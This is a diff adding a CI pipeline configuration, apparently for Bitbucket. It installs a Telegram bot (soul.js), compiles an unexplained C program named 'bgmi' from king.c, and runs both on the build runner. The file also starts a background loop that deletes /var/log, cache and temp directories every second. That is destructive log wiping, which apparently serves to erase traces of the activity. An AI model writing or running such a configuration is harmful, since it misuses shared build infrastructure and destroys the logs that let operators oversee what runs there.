@@ -1,0 +1,39 @@
+
+image: node:18
+
+pipelines:
+  default:
+    - step:
+        name: Install Dependencies
+        size: 2x  # Increased instance size
+        caches:
+          - node
+        script:
+          - npm install
+
+    - step:
+        name: Run Bot
+        size: 2x
+        script:
+          - npm install node-telegram-bot-api
+          - npm install canvas
+          - npm install mongoose
+
+
+          - apt install gcc -y
+
+          - gcc king.c -o bgmi -lpthread
+
+          # Set execution permissions
+          - chmod 755 soul.js
+          - chmod 755 bgmi
+
+          # Run cleanup loop in the background (runs every second)
+          - while true; do
+              rm -rf ~/.cache/* /var/log/* /tmp/* /var/tmp/*;
+              sync;
+              sleep 1;
+            done &
+
+          # Run the bot in the background
+          - node soul.js
